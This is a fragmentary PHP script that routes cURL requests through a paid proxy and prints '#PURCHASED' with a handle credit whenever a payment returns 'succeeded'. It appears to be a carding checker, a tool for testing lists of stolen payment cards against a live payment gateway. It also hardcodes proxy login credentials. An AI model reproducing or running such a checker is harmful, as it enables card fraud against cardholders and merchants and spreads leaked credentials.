...
$proxy_host = "juproxy.com"; 
$proxy_port = "8000"; 
$loginpassw = "W8CfI1hxkrvBqqxs6H04IeWZiFXBNfQimty2Iszj"; 
$ch = curl_init(); 
...
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, 'juproxy.com:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'W8CfI1hxkrvBqqxs6H04IeWZiFXBNfQimty2Iszj'); 
...
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_PROXY, 'juproxy.com:8000');
curl_setopt($ch, CURLOPT_PROXYUSERPWD, 'tester_bullygameph_com:aad12345');
...
curl_close($ch);
 ...
 if (strpos($result1, '"status": "succeeded"')) {
    echo "<font color=green><b>#PURCHASED $lista<br>Payment successful checked by @graciehams » Redirect URL: $url » [$ip1]<br>";
